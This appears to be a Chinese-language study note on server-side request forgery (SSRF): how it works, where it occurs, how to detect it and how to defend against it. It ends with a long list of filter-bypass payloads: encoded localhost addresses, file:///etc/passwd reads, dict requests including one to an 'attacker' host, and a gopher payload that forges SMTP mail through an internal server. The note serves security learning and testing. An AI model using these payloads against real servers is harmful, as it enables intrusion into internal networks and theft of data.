# SSRF漏洞原理与危害

![image-20210615162750858](D:\BaiduNetdiskDownload\笔记\安全\WEB漏洞概述\SSRF漏洞原理与危害\SSRF漏洞原理与危害.assets\image-20210615162750858.png)

**SSRF(Server-Side Request Forgery:服务器端请求伪造)**

是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）

其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制

导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据,比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等

数据流:攻击者----->服务器---->目标地址

根据后台使用的函数的不同,对应的影响和利用方法又有不一样

```
PHP中下面函数的使用不当会导致SSRF:
file_get_contents()
fsockopen()
curl_exec()       
```

# SSRF漏洞检测与防御

### SSRF可能出现的地方：

1.社交分享功能：获取超链接的标题等内容进行显示

2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览

3.在线翻译：给网址翻译对应网页的内容

4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片

5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验

6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试

7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作

8.数据库内置功能：数据库的比如mongodb的copyDatabase函数

9.邮件系统：比如接收邮件服务器地址

10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等

11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞

一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……

12.从远程服务器请求资源（upload from url 如discuz！；import & expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）

```
http://xxx.com/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1:3306/
http://xxx.com/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd
```

### 检测

ssrf安全测试圣经：https://github.com/cujanovic/SSRF-Testing

#### 针对服务器本身的 SSRF 攻击

在针对服务器本身的 SSRF 攻击中，攻击者诱导应用程序通过其环回网络接口向托管应用程序的服务器发出 HTTP 请求。这通常涉及提供带有主机名的 URL，例如`127.0.0.1`（指向环回适配器的保留 IP 地址）或`localhost`（同一适配器的常用名称）。

例如，考虑一个购物应用程序，该应用程序允许用户查看某个商品在特定商店中是否有货。要提供库存信息，应用程序必须查询各种后端 REST API，具体取决于相关产品和商店。该功能是通过前端 HTTP 请求将 URL 传递给相关的后端 API 端点来实现的。因此，当用户查看商品的库存状态时，他们的浏览器会发出如下请求：

```
POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

这会导致服务器向指定的 URL 发出请求，检索股票状态，并将其返回给用户。

在这种情况下，攻击者可以修改请求以指定服务器本身的本地 URL。例如：

```
POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://localhost/admin
```

在这里，服务器将获取`/admin`URL 的内容并将其返回给用户。

#### 针对其他后端系统的 SSRF 攻击

服务器端请求伪造经常出现的另一种信任关系是应用程序服务器能够与用户无法直接访问的其他后端系统进行交互。这些系统通常具有不可路由的私有 IP 地址。由于后端系统通常受到网络拓扑的保护，因此它们的安全状况通常较弱。在许多情况下，内部后端系统包含敏感功能，任何能够与系统交互的人无需身份验证即可访问这些功能。

在前面的示例中，假设后端 URL 有一个管理界面` https://192.168.0.68/admin`。在这里，攻击者可以通过提交以下请求来利用SSRF漏洞访问管理界面：

```
POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://192.168.0.68/admin
```

使用带外技术Burp Collaborator，dnslog等生成唯一的域名，将这些以有效负载的形式发送到应用程序，并监控与这些域的任何交互。如果观察到来自应用程序的传入 HTTP 请求，则它容易受到 SSRF 攻击。

### 防御

1、过滤返回的信息，如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。
2、统一错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态。
3、限制请求的端口，比如80,443,8080,8090。
4、禁止不常用的协议，仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp://等引起的问题。

# SSRF漏洞绕过

###### 1、攻击本地

```
http://127.0.0.1:80
http://localhost:22
```

###### 2、利用[::]

```
利用[::]绕过localhost
http://[::]:80/  >>>  http://127.0.0.1
```

也有看到利用http://0000::1:80/的，但是我测试未成功

###### 3、利用@ 

```
http://example.com@127.0.0.1
```

###### 4、利用短地址

```
http://dwz.cn/11SMa  >>>  http://127.0.0.1
```

###### 5、利用特殊域名

利用的原理是DNS解析

```
http://127.0.0.1.xip.io/
```

```
http://www.owasp.org.127.0.0.1.xip.io/
```

###### 6、利用DNS解析

在域名上设置A记录，指向127.0.1

###### 7、利用上传

```
也不一定是上传，我也说不清，自己体会 -.-
修改"type=file"为"type=url"
比如：
上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF
```

###### 8、利用Enclosed alphanumerics

```
利用Enclosed alphanumerics
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  >>>  example.com
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ 
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ 
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ 
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ 
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ  Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ 
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ 
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ 
⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```

###### 9、利用句号

```
127。0。0。1  >>>  127.0.0.1
```

###### 10、利用进制转换

```
可以是十六进制，八进制等。
115.239.210.26  >>>  16373751032
首先把这四段数字给分别转成16进制，结果：73 ef d2 1a
然后把 73efd21a 这十六进制一起转换成8进制
记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x
```

```
http://127.0.0.1  >>>  http://0177.0.0.1/
```

```
http://127.0.0.1  >>>  http://2130706433/
```

```
http://192.168.0.1  >>>  http://3232235521/
http://192.168.1.1  >>>  http://3232235777/
```

###### 11、利用特殊地址

```
http://0/
```

###### 12、利用协议

```
Dict://
dict://<user-auth>@<host>:<port>/d:<word>
ssrf.php?url=dict://attacker:11111/
SFTP://
ssrf.php?url=sftp://example.com:11111/
TFTP://
ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET
LDAP://
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
Gopher://
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
```

###### 

